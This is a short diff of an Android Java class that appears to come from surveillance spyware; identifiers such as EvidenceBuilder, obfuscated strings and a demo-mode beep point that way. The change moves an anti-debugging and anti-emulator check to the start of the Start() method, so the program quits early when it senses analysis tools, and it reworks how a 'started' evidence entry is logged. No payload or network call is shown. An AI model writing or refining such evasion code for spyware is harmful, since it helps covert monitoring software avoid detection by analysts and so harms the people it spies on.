@@ -118,6 +118,15 @@ public class Core extends Activity implements Runnable {
 
 	public boolean Start(final Resources resources, final ContentResolver cr) {
 
+
+		// ANTIDEBUG ANTIEMU
+		if (!check()) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (Start) anti emu/debug failed");
+			}
+			return false;
+		}
+
 		if (serviceRunning) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (Start): service already running"); //$NON-NLS-1$
@@ -167,13 +176,6 @@ public class Core extends Activity implements Runnable {
 			return false;
 		}
 
-		// ANTIDEBUG ANTIEMU
-		if (!check()) {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (Start) anti emu/debug failed");
-			}
-			return false;
-		}
 
 		coreThread = new Thread(this);
 
@@ -208,9 +210,9 @@ public class Core extends Activity implements Runnable {
 			wl.acquire();
 		}
 
-		EvidenceBuilder.info(M.e("Started")); //$NON-NLS-1$
-
 		serviceRunning = true;
+
+		EvidenceBuilder.infoStart(); //$NON-NLS-1$
 
 		if (Cfg.DEMO) {
 			Beep.bip();
